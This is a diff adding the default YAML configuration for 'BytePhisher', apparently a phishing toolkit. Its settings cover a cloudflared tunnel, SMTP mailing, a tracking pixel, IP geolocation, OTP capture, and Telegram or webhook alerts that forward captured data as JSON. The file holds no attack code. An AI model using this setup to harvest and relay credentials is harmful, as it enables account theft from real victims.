@@ -1,0 +1,21 @@
+# BytePhisher default config — override via CLI flags or this file
+port: 8080
+db_path: data/bytephisher.db
+geo_provider: ipapi            # ipapi | ipinfo | off
+otp_default: false
+redirect_url: ""
+tunneler_default: cloudflared
+smtp:
+  host: ""
+  port: 587
+  user: ""
+  pass: ""
+  use_starttls: true
+tracking_pixel: true
+
+# real-time alerts (also settable with --telegram / --webhook)
+telegram: ""                  # "BOT_TOKEN:CHAT_ID"
+webhook: ""                   # any URL receiving the capture as JSON
+telegram_api_base: ""         # empty = real api.telegram.org (tests point this at a stub)
+
+# update check (optional): set a repo to get a startup notice for newer releases
